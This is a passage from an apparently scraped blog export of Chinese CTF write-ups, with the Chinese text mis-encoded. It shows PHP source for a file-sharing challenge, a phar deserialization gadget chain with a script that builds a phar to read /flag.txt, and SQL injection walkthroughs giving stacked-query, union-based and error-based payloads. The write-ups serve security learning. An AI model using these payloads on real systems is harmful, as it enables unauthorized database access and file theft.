($this-&gt;user_exist($username)) &#123; return false; &#125; $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;); $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;); $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125; &#125; class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files &#x3D; array(); $this-&gt;results &#x3D; array(); $this-&gt;funcs &#x3D; array(); $filenames &#x3D; scandir($path); $key &#x3D; array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key &#x3D; array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file &#x3D; new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] &#x3D; array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;; $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;; foreach ($this-&gt;funcs as $func) &#123; $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;; &#125; $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;; $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;; foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123; $table .&#x3D; &#39;&lt;tr&gt;&#39;; foreach ($result as $func &#x3D;&gt; $value) &#123; $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;; &#125; $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;ä¸‹è½½&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;åˆ é™¤&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;; $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;; &#125; echo $table; &#125; &#125; class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename &#x3D; $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size &#x3D; filesize($this-&gt;filename); $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;); for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125; &#125; ?&gt; delete.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; if (!isset($_POST[&#39;filename&#39;])) &#123; die(); &#125; include &quot;class.php&quot;; chdir($_SESSION[&#39;sandbox&#39;]); $file &#x3D; new File(); $filename &#x3D; (string) $_POST[&#39;filename&#39;]; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application&#x2F;json&quot;); $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;); echo json_encode($response); &#125; else &#123; Header(&quot;Content-type: application&#x2F;json&quot;); $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;); echo json_encode($response); &#125; ?&gt; pharååºåˆ—åŒ–åˆ©ç”¨æ¡ä»¶ï¼š 1ï¼‰pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ è‡³æœåŠ¡å™¨ 2ï¼‰è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä¸ºè·³æ¿ 3ï¼‰æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ å¯¹äºæœ¬é¢˜è€Œè¨€ï¼Œç¬¬ä¸€æ¡æ»¡è¶³ï¼Œç¬¬äºŒæ¡æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³•__call()å’ŒFileListç±»ã€Userç±»çš„__destruct()ï¼Œææ€•æƒ³ä¸åˆ©ç”¨å®ƒä»¬ä¹Ÿä¸è¡Œï¼Œç¬¬ä¸‰æ¡ååŠéƒ¨åˆ†æ²¡é—®é¢˜ï¼Œå‰åŠéƒ¨åˆ†åˆ™éœ€è¦æˆ‘ä»¬æ‰¾ä¸€æ‰¾ã€‚ æ—¢æ›°æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå°±åº”è¯¥åœ¨æœ¬é¢˜çš„Fileç±»ï¼ˆè‡³å¤šä¹Ÿåœ¨FileListç±»ï¼‰çš„æ–¹æ³•ä¸­å¯»æ‰¾ï¼Œæ¯•ç«Ÿæ•´ä¸ªé¢˜ç›®åŸºæœ¬ä¸Šéƒ½æ˜¯åœ¨é¢å‘å¯¹è±¡çš„åŸºç¡€ä¸Šç¼–ç¨‹ï¼Œå¯¹æ–‡ä»¶çš„æ“ä½œä¹Ÿéƒ½æ˜¯å¯¹Fileç±»çš„å¯¹è±¡çš„æ“ä½œï¼Œ æˆ‘ä»¬çœ‹åˆ°ï¼Œopen()æ–¹æ³•è°ƒç”¨äº†file_exists()å’Œis_dir()å‡½æ•°ï¼ˆæ³¨æ„nameæ–¹æ³•é‡Œçš„basenameå‡½æ•°ä¸ç®—ï¼‰ï¼Œsize()æ–¹æ³•è°ƒç”¨äº†filesize()å‡½æ•°ï¼Œdelete()æ–¹æ³•è°ƒç”¨äº†unlink()å‡½æ•°ï¼Œclose()æ–¹æ³•file_get_contents()å‡½æ•°ã€‚ æˆ‘ä»¬å‰é¢æåˆ°äº†ï¼Œæœ¬é¢˜è¦è¯»å–/flag.txtæ–‡ä»¶ï¼Œæ•…åˆšåˆšåˆ—ä¸¾çš„è¿™äº›å‡½æ•°ä¸­ï¼Œè™½ç„¶æ–‡ä»¶æ“ä½œå‡½æ•°ä¸å°‘ï¼Œå¯ä»¥ç”¨æ¥è§¦å‘ååºåˆ—åŒ–ï¼Œå¯¹è¯»å–æ–‡ä»¶æœ‰ç”¨çš„åªæœ‰close()æ–¹æ³•ä¸­çš„file_get_contents()å‡½æ•°è¿™ä¸€ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹å®ƒåˆ†æï¼Œ è¿™ä¸ªæ—¶å€™ï¼Œå¦‚æœæƒ³ä¸åˆ°__call()æ–¹æ³•å’Œ__destruct()æ–¹æ³•ï¼ŒåŸºæœ¬ä¸Šå°±å¯ä»¥æ”¾å¼ƒäº†ï¼Œåœ¨pharé¢˜ç›®é‡Œï¼Œé­”æœ¯æ–¹æ³•ä¸€èˆ¬æ¥è®²æ˜¯å¿…é¡»è¦ç”¨çš„ï¼Œ è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°ï¼ŒFileListçš„__call()æ–¹æ³•è¯­ä¹‰ç®€å•ï¼Œå°±æ˜¯éå†filesæ•°ç»„ï¼Œå¯¹æ¯ä¸€ä¸ªfileå˜é‡æ‰§è¡Œä¸€æ¬¡$funcï¼Œç„¶åå°†ç»“æœå­˜è¿›$resultsæ•°ç»„ï¼Œ æ¥ä¸‹æ¥çš„__destructå‡½æ•°ä¼šå°†FileListå¯¹è±¡çš„funcså˜é‡å’Œresultsæ•°ç»„ä¸­çš„å†…å®¹ä»¥HTMLè¡¨æ ¼çš„å½¢å¼è¾“å‡ºåœ¨index.phpä¸Šï¼ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œindex.phpé‡Œåˆ›å»ºäº†ä¸€ä¸ªFileListå¯¹è±¡ï¼Œåœ¨è„šæœ¬æ‰§è¡Œå®Œæ¯•åè§¦å‘__destructï¼Œåˆ™ä¼šè¾“å‡ºè¯¥ç”¨æˆ·ç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯ï¼‰ï¼Œ Userå¯¹è±¡çš„__destruct()æ–¹æ³•ï¼Œ æ— éå°±æ˜¯ è„šæœ¬æ‰§è¡Œå®Œæ¯•åï¼Œæ‰§è¡Œ$dbçš„close()çš„æ–¹æ³•ï¼ˆæ¥å…³é—­æ•°æ®åº“è¿æ¥ï¼‰ï¼Œä½†è¯è¯´å›æ¥ï¼Œæ²¡æœ‰æ‹¬å·é‡Œçš„è¯ï¼Œè¿™å¥è¯ä¾ç„¶æˆç«‹ï¼Œè€Œä¸”è¿™ä¸ª&#39;close&#39;ä¸Fileç±»ä¸­çš„close()æ–¹æ³•åŒåã€‚æ‰€ä»¥ï¼Œå½“dbçš„å€¼ä¸ºä¸€ä¸ªFileListå¯¹è±¡æ—¶ï¼ŒUserå¯¹è±¡ææ„ä¹‹æ—¶ï¼Œä¼šè§¦å‘FileList-&gt;close()ï¼Œä½†FileListé‡Œæ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œäºæ˜¯è°ƒç”¨_callå‡½æ•°ï¼Œè¿›è€Œæ‰§è¡Œfile_get_contents($filename)ï¼Œè¯»å–äº†æ–‡ä»¶å†…å®¹ã€‚æ•´ä¸ªé“¾çš„ç»“æ„ä¹Ÿå¾ˆç®€å•æ¸…æ™°ï¼šåœ¨æˆ‘ä»¬æ§åˆ¶$dbä¸ºä¸€ä¸ªFileListå¯¹è±¡çš„æƒ…å†µä¸‹ï¼Œ$user-&gt;__destruct() =&gt; $db-&gt;close() =&gt; $db-&gt;__call(&#39;close&#39;) =&gt; $file-&gt;close() =&gt; $results=file_get_contents($filename) =&gt; FileList-&gt;__destruct()è¾“å‡º$resultã€‚ ååºåˆ—åŒ–è„šæœ¬ &lt;?php class User &#123; public $db; &#125; class File&#123; public $filename; public function __construct($name)&#123; $this-&gt;filename&#x3D;$name; &#125; &#125; class FileList &#123; private $files; public function __construct()&#123; $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;)); &#125; &#125; $o &#x3D; new User(); $o-&gt;db &#x3D;new FileList(); @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); ?&gt; å‚è€ƒæ–‡ç«  [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropboxä¹‹æ„šè§ - ç®€ä¹¦ (jianshu.com) [(24æ¡æ¶ˆæ¯) å…³äºpharååºåˆ—åŒ–â€”â€”BUUCTF-CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox_silence1_çš„åšå®¢-CSDNåšå®¢_buuctf ååºåˆ—åŒ–","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"sqlé¢˜wp","slug":"buu-sqlé¢˜wp","date":"2021-06-16T08:30:58.000Z","updated":"2022-01-17T08:29:45.465Z","comments":true,"path":"2021/06/16/buu-sqlé¢˜wp/","link":"","permalink":"https://ethe448.github.io/2021/06/16/buu-sql%E9%A2%98wp/","excerpt":"sqlå¥½éš¾.jpg","text":"sqlå¥½éš¾.jpg [æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL ç”¨æˆ·æ¡†é‡Œè¾“å…¥å•å¼•å·å‡ºç°æŠ¥é”™ï¼ŒçŒœæµ‹ä¸ºå­—ç¬¦å‹æ³¨å…¥ åˆ©ç”¨1&#39;or 1#æ³¨å…¥å¾—åˆ°flag [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨å…ˆè¯•ä¸€ä¸‹ä¸‡èƒ½å¯†ç  åˆ©ç”¨1â€˜ order by å¯ä»¥è¯•å‡ºè¯¥è¡¨ä¸­å­˜åœ¨ä¸¤ä¸ªå­—æ®µ æ¥ä¸‹æ¥è¦ç”¨å †å æŸ¥è¯¢ï¼ˆåˆ©ç”¨åˆ†å·æ‰§è¡Œå¤šä¸ªsqlè¯­å¥ï¼‰ å°è¯•å…ˆæŸ¥è¯¢æ•°æ®åº“ æˆåŠŸã€‚ å†æŸ¥è¯¢è¡¨å çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨ï¼ŒæŸ¥è¯¢ä¸¤ä¸ªè¡¨ä¸­çš„å­—æ®µ wordsè¡¨å†…å­˜åœ¨ä¸¤ä¸ªå­—æ®µ 1919810931114514è¡¨å†…å­˜åœ¨ä¸€ä¸ªå­—æ®µï¼Œflagåœ¨è¯¥è¡¨å†…ã€‚ ï¼ˆæŸ¥è¯¢è¯¥è¡¨æ—¶è¡¨åè¦åœ¨åå•å¼•å·å†…ï¼‰ 1&#39;;show columns from 1919810931114514# æ‰€ä»¥å¯ä»¥çŒœæµ‹ å†…éƒ¨æŸ¥è¯¢è¯­å¥ç±»ä¼¼ : select id, data from words where id = æ‰€ä»¥è¦æŠŠwordsè¡¨æ”¹ä¸ºword1ï¼Œå°†flagæ‰€åœ¨çš„è¡¨è¡¨åæ”¹ä¸ºwordsï¼Œç„¶åå°†flagæ”¹åä¸ºidï¼› payloadï¼š1&#39;;rename table words to word1;rename table 1919810931114514 to words; alert table words change flag id varchar(100);# å†ç”¨1â€™ or 1#æ³¨å…¥ ä¹Ÿå¯ä»¥æŠŠwordsè¡¨æ”¹ä¸ºwordsï¼Œå°†flagæ‰€åœ¨çš„è¡¨è¡¨åæ”¹ä¸ºwordsï¼Œå†ä¸ºå…¶æ·»åŠ idåˆ—ï¼Œå¹¶å°†flagæ”¹ä¸ºdata payloadï¼š1&#39;;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# å†å°†1æäº¤å¯ç›´æ¥è·å¾—flag [SUCTF 2019]EasySQLè¿›å…¥åè¾“å…¥1æœ‰å›æ˜¾ è¾“å…¥1â€˜æ— å›æ˜¾çŒœæµ‹æ˜¯æ•°å­—å‹æ³¨å…¥ ç”¨å †å æ³¨å…¥çš„æ–¹å¼ æŸ¥åˆ°å­˜åœ¨ä¸€ä¸ªflagè¡¨ï¼Œå°è¯•æŸ¥çœ‹é‡Œé¢çš„å†…å®¹ å¤§æ¦‚æ˜¯è¢«è¿‡æ»¤äº†ï¼Œåªå¥½ç™¾åº¦æœwpäº† çœ‹åˆ°dalaoèƒ½å¤ŸçŒœå‡ºåç«¯è¯­å¥ä¸ºselect &quot;.$post[&#39;query&#39;].&quot;||flag from Flag ï¼ˆæœåˆ°ä¸€ç¯‡wpè¯´åŸç¯å¢ƒä¸­å­˜åœ¨æºç æ³„éœ²ï¼Œæ‰€ä»¥èƒ½å¤ŸçŸ¥é“è¿™éƒ¨åˆ†çš„sqlè¯­è¨€ï¼Œä½†æ˜¯buuçš„ç¯å¢ƒé‡Œæ²¡æœ‰[BUUCTF SUCTF 2019] EasySQL_Senimo-CSDNåšå®¢ï¼‰ è§£æ³•ä¸€ï¼šè¾“å…¥*,1 ç”±äº||åœ¨MySQLä¸­èµ·æˆ–çš„ä½œç”¨ï¼Œå› æ­¤1||flagä¼šè¿”å›1ï¼Œä¹Ÿå°±å˜æˆäº† select *,1 from Flag. æˆåŠŸæ‰¾åˆ°flag ç”±äºselect 1 from Flag æ˜¯å¢åŠ ä¸€ä¸ªä¸´æ—¶åˆ—ï¼Œå®ƒçš„åˆ—åæ˜¯1ï¼Œç„¶åé‚£ä¸€åˆ—çš„å€¼éƒ½ä¸º1 å› æ­¤åœ¨æŸ¥è¯¢çš„flagåè¿˜æœ‰ä¸€ä¸ªå€¼ä¸º1çš„ä¸´æ—¶åˆ— è§£æ³•äºŒ æŠŠ&quot;||&quot;å˜æˆå­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œè€Œä¸æ˜¯æˆ–ã€‚è¿™é‡Œæ¶‰åŠåˆ°mysqlä¸­sql_modeå‚æ•°è®¾ç½®ï¼Œè®¾ç½®sql_mode=pipes_as_concatå­—ç¬¦å°±å¯ä»¥è®¾ç½®ã€‚ payloadï¼š1;set sql_mode=PIPES_AS_CONCAT;select 1 ä¹Ÿèƒ½è·å¾—flagã€‚ è¿™æ˜¯æŸ¥è¯¢è¯­å¥ç›¸å½“äºselect 1flag from Flag (ä¸å¤ªæ‡‚ä¸ºå•¥è¿™æ ·ä¹Ÿèƒ½æŸ¥å‡ºæ¥ï¼Œ1flagæ˜¯åˆ—åå¦‚æœFlagè¡¨é‡Œæ²¡æœ‰è¿™ä¸€åˆ—å‘¢ï¼Ÿï¼Ÿ) [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQLç”¨åˆ°äº†è”åˆæŸ¥è¯¢ åŸç†ç¯‡â€”â€”sqlæ³¨å…¥2ï¼šè”åˆæŸ¥è¯¢æ³¨å…¥ - è¿™å¤ªç§ƒç„¶äº† - åšå®¢å›­ (cnblogs.com) SQLæ³¨å…¥ä¹‹è”åˆæŸ¥è¯¢æ³¨å…¥_selecthchçš„åšå®¢-CSDNåšå®¢_è”åˆæ³¨å…¥ å‚è€ƒä¸€ä¸‹ å¸¸è§„æ­¥éª¤ 1. åˆ¤æ–­æ³¨å…¥ç‚¹ 2. åˆ¤æ–­æ³¨å…¥ç±»å‹ï¼ˆæ•°å­—å‹å‹orå­—ç¬¦å‹ï¼‰ 3. åˆ¤æ–­å­—æ®µæ•° 4. åˆ¤æ–­å›æ˜¾ä½ 5. ç¡®å®šæ•°æ®åº“å 6. ç¡®å®šè¡¨å 7. ç¡®å®šå­—æ®µå 8. æ‹¿åˆ°æ•°æ® 1.åˆ¤æ–­æ³¨å…¥ç‚¹ â€‹ åœ¨è¾“å…¥çš„ç”¨æˆ·ååæ·»åŠ å•å¼•å·è¿”å›å‡ºé”™ï¼ŒçŒœæµ‹å­˜åœ¨æ³¨å…¥ 2.åˆ¤æ–­æ³¨å…¥ç±»å‹ â€‹ åœ¨ç”¨æˆ·ååè¾“å…¥1â€™ or 1#åæˆåŠŸè¿›å…¥ï¼Œä½†è¿˜æ˜¯æ²¡æœ‰æ‹¿åˆ°flagï¼Œå› æ­¤ç»§ç»­å°è¯•æ³¨å…¥ 3.åˆ¤æ–­å­—æ®µæ•° â€‹ å½“order by 4æ—¶å‡ºé”™ï¼Œå› æ­¤åº”æœ‰ä¸‰ä¸ªå­—æ®µæ•° 4.åˆ¤æ–­å›æ˜¾ä½ 5ã€‚ç¡®å®šæ•°æ®åº“å â€‹ ä¸ºäº†è·å–æ‰€æœ‰æ•°æ®åº“åï¼Œè¦åˆ©ç”¨group_concat()å‡½æ•°ä»¤å…¶ä¸€æ¬¡æ€§æ˜¾ç¤ºå‡ºæ¥ 1&#39; union select 1,2,group_concat(database());# 6.ç¡®å®šè¡¨å 1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();# ã€INFORMATION_SCHEMA æ•°æ®åº“ã€‘ æ˜¯MySQLè‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“ å…ƒæ•°æ® çš„æ–¹å¼ã€‚å…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚ å¸¸ç”¨å­—æ®µ å­—æ®µ å«ä¹‰ Table_catalog æ•°æ®è¡¨ç™»è®°ç›®å½• Table_schema æ•°æ®è¡¨æ‰€å±çš„æ•°æ®åº“å Table_name è¡¨åç§° Table_type è¡¨ç±»å‹[system view|base table] Engine ä½¿ç”¨çš„æ•°æ®åº“å¼•æ“[MyISAM|CSV|InnoDB] Version ç‰ˆæœ¬ï¼Œé»˜è®¤å€¼10 Row_format è¡Œæ ¼å¼[Compact|Dynamic|Fixed] Table_rows è¡¨é‡Œæ‰€å­˜å¤šå°‘è¡Œæ•°æ® Avg_row_length å¹³å‡è¡Œé•¿åº¦ Data_length æ•°æ®é•¿åº¦ Max_data_length æœ€å¤§æ•°æ®é•¿åº¦ Index_length ç´¢å¼•é•¿åº¦ Data_free ç©ºé—´ç¢ç‰‡ Auto_increment åšè‡ªå¢ä¸»é”®çš„è‡ªåŠ¨å¢é‡å½“å‰å€¼ Create_time è¡¨çš„åˆ›å»ºæ—¶é—´ Update_time è¡¨çš„æ›´æ–°æ—¶é—´ Check_time è¡¨çš„æ£€æŸ¥æ—¶é—´ Table_collation è¡¨çš„å­—ç¬¦æ ¡éªŒç¼–ç é›† Checksum æ ¡éªŒå’Œ Create_options åˆ›å»ºé€‰é¡¹ Table_comment è¡¨çš„æ³¨é‡Šã€å¤‡æ³¨ ç¡®å®šå­—æ®µå çŒœæµ‹flagåº”è¯¥åœ¨l0ve1ysq1è¡¨ä¸­ï¼Œå› æ­¤æŸ¥æ‰¾è¯¥è¡¨å†…çš„å­—æ®µå 1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;;# 8.æ‹¿åˆ°æ•°æ® æŸ¥æ‰¾è¿™ä¸‰åˆ—ä¸­çš„å…¨éƒ¨æ•°æ®ï¼Œåˆ©ç”¨group_concat(); 1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#; å¾—åˆ°flag MySQLé»˜è®¤æœ‰â€œinformation_schemaâ€çš„æ•°æ®åº“ï¼Œè¯¥åº“ä¸­æœ‰ä¸‰ä¸ªè¡¨åï¼š 1ã€SCHEMATAï¼šå­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åï¼Œè®°å½•åº“åçš„å­—æ®µä¸ºSCHEMA_NAMEã€‚2ã€TABLESï¼šå­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åå’Œè¡¨åï¼Œè®°å½•åº“åå’Œè¡¨åçš„å­—æ®µä¸ºTABLE_SCHEMAå’ŒTABLE_NAMEã€‚3ã€COLUMNSï¼šå­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€è¡¨åå’Œå­—æ®µåï¼Œåº“åã€è¡¨åå’Œå­—æ®µåä¸ºTABLE_SCHEMAã€TABLE_NAMEå’ŒCOLUMN_NAMEã€‚ ctfhubâ€”SQL æ•´æ•°å‹æ³¨å…¥è¾“å…¥1æœ‰å›æ˜¾ è¾“å…¥1 and 1=2æ— å›æ˜¾ï¼Œæ—¢å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ•´æ•°å‹æ³¨å…¥ åˆ©ç”¨order byå¯çŸ¥å­˜åœ¨ä¸¤ä¸ªå­—æ®µ åˆ©ç”¨è”åˆæŸ¥è¯¢æŸ¥è¯¢æ•°æ®åº“åç§° å†æŸ¥æ‰¾è¡¨å flagåº”è¯¥å°±åœ¨flagè¡¨å†…ï¼Œå†æŸ¥æ‰¾å­—æ®µå æœ€åå¾—åˆ°flag ctfhubâ€”SQLå­—ç¬¦å‹æ³¨å…¥åˆ©ç”¨order byåˆ¤æ–­å­—æ®µæ•° è¾“å…¥-1&#39; union select 1,2#åˆ¤æ–­å›æ˜¾ä½ç½® æŸ¥æ•°æ®åº“å æŸ¥è¡¨å æŸ¥å­—æ®µå æŸ¥flag -1&#39; union select 1,group_concat(flag) from flag# æ„Ÿè§‰å’Œæ•´æ•°å‹æ³¨å…¥å·®ä¸å¤š ctfhubâ€”æŠ¥é”™æ³¨å…¥åˆ©ç”¨xpathè¯­æ³•é”™è¯¯æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ©ç”¨extractvalueå’Œupdatexmlä¸¤ä¸ªå‡½æ•°ã€‚ extractvalue() å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string) æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string); ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§° ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸² ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸² ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ payloadæ¨¡æ¿ &#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) 0x7e=â€™~â€™ concat(â€˜aâ€™,â€˜bâ€™)=â€œabâ€ version()=@@version â€˜~â€˜å¯ä»¥æ¢æˆâ€™#â€™ã€â€™$&#39;ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦ extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½ è¿”å›ç»“æœä¸èƒ½è¶…è¿‡ä¸€æ¡ è‹¥è¶…è¿‡åˆ™éœ€å†æŸ¥è¯¢è¯­å¥åæ·»åŠ limit x,1æˆ–ç”¨group_concat()å‡½æ•° updatexml() updatexml()å‡½æ•°ä¸extractvalue()ç±»ä¼¼ï¼Œæ˜¯æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°ã€‚ and 1=(updataxml(1,concat(0x7e,(sql_inject),0x7e),1)) flood() åŸç†è¿˜æ²¡çœ‹æ˜ç™½ï¼ˆ å…ˆæ”¾ä¸ªæ¨¡æ¿åœ¨è¿™ 1 Union select count(*),concat((æŸ¥è¯¢è¯­å¥),0x26,floor(rand(0)*2))x from information_schema.columns group by x; é¢˜ç›®ï¼š åˆ©ç”¨extractvalue è¾“å…¥å•å¼•å·æç¤ºè¯­æ³•é”™è¯¯ï¼Œè¾“å…¥and 1=1èƒ½æ­£ç¡®æŸ¥è¯¢ï¼ŒçŒœæµ‹ä¸ºæ•°å­—å‹ï¼Œåˆ©ç”¨extractvalueå‡½æ•°çˆ†åº“å å†çˆ†è¡¨å è¿™é‡Œæç¤ºå¤ªé•¿å› æ­¤åˆ©ç”¨group_concat()å‡½æ•° çŒœåˆ°flagå†flagè¡¨å†…çˆ†åˆ—å æœ€åæŸ¥è¯¢å†…å®¹ 1 and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e)) ç”±äºextractvalueå‡½æ•°åªèƒ½æ˜¾ç¤º32ä½å­—ç¬¦ï¼Œæ‰€ä»¥è¦åˆ©ç”¨substringå‡½æ•°è¿›è¡Œåˆ†å‰² åˆ©ç”¨substringæŸ¥çœ‹å³è¾¹31ä½å­—ç¬¦ æœ€åå¯ä»¥æ‹¿åˆ°flag ctfhub{ff3bb0327849e1b9e0e6abfd} åˆ©ç”¨updataxmlå‡½æ•° åˆ©ç”¨floodå‡½æ•° 